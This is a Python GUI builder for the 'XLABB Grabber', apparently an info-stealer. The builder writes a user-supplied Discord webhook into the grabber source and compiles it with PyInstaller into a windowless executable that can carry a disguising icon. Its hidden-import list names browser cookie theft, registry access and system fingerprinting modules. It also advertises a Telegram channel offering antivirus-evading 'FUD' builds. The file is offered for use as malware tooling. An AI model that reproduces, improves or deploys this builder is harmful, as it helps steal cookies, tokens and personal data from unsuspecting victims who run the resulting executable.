import os
import shutil
import requests
import subprocess
import customtkinter as ctk
from tkinter import messagebox, filedialog

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"t.me/benzoX | XLABB Grabber")
app.iconbitmap("img\\xlabb.ico")
app.geometry("580x300")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'xlabbgrabber.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('hook ='):
            lines[i] = f'hook = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - t.me/benzoX"
        messagebox.showinfo("Information", message)

        # Liste des modules à inclure explicitement (hidden imports)
        hidden_imports = [
            "discord_webhook", "discord", "browser_cookie3", "psutil", "threading",
            "subprocess", "winreg", "platform", "requests", "getmac", "ssl",
            "socket", "OpenSSL", "difflib", "sys", "sqlite3", "re", "base64",
            "json", "ctypes", "tokenize", "urllib.request", "time", "shutil",
            "zipfile", "random", "uuid", "getpass", "wmi"
        ]

        # Générer la chaîne des --hidden-import pour PyInstaller
        hidden_import_options = " ".join(f"--hidden-import={module}" for module in hidden_imports)

        # Construire la commande PyInstaller complète
        build_command = f'pyinstaller xlabbgrabber.py --noconsole --onefile{icon_option} {hidden_import_options}'

        # Lancer la compilation
        os.system(build_command)

        messagebox.showinfo("Build Success",
                            "Build process completed successfully.\n"
                            "Don't forget to star the repo and join Telegram channel to support and receive latest updates!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")


label = ctk.CTkLabel(master=app, text="𝐗𝐋𝐀𝐁𝐁 𝐆𝐫𝐚𝐛𝐛𝐞𝐫", text_color=("red"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="red", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()
